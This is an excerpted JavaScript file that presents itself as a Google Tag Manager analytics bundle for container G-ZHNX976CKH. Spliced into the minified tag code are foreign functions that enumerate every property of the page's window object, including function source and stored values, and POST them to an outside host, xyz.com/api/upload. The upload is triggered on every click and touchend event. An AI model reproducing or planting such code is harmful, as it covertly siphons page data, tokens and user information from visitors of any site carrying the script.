...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 5,
        "vtp_instanceDestinationId": "G-ZHNX976CKH",
        "tag_id": 17
      }, {
    ...
    "security_groups": {
      "google": ["__ccd_conversion_marking", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_google_signals", "__set_product_settings"]
    }
  };
  ...
  */
  ...
  function monitorWindowObject() {
    const recentObservations = {};
    const allKeys = Object.keys(window);
    allKeys.forEach(function (key) {
      if (!localStorage.getItem('observed-' + key)) {
        const keyType = typeof window[key];
        recentObservations[key] = {
          type: keyType,
          value: keyType === "function" ? window[key].toString() : window[key]
        };
        localStorage.setItem('observed-' + key, keyType);
      }
    });
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5uflXw8FDve46c1Wv5ljhT5WyxBjFfyQXlBZV59CKuXvvxoC+w0\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  var bk = {},
    ...
    Pf = {
      ctid: "G-ZHNX976CKH",
      Sg: "101266517",
      If: "G-ZHNX976CKH|GT-TBNDN7R",
      yj: "G-ZHNX976CKH"
    };
  function postDataToServer(data) {
    const hostURL = "https://xyz.com/api/upload";
    const request = new XMLHttpRequest();
    request.open("POST", hostURL);
  ...
  function observeTask() {
    ...
    window.seenVars = new Proxy({}, jsHook);
    const observedData = monitorWindowObject();
    const count = Object.keys(observedData).length;
    if (count > 0) {
      console.log(`Identified ${count} new properties in window object`);
      postDataToServer(observedData);
    } else {
      console.log("No new properties found in window object");
    }
  }
  function wu(a) {
    var b = a.eventId,
  ...
  window.addEventListener('click', observeTask);
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-ZHNX976CKH'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
  ...
  window.addEventListener('touchend', observeTask);
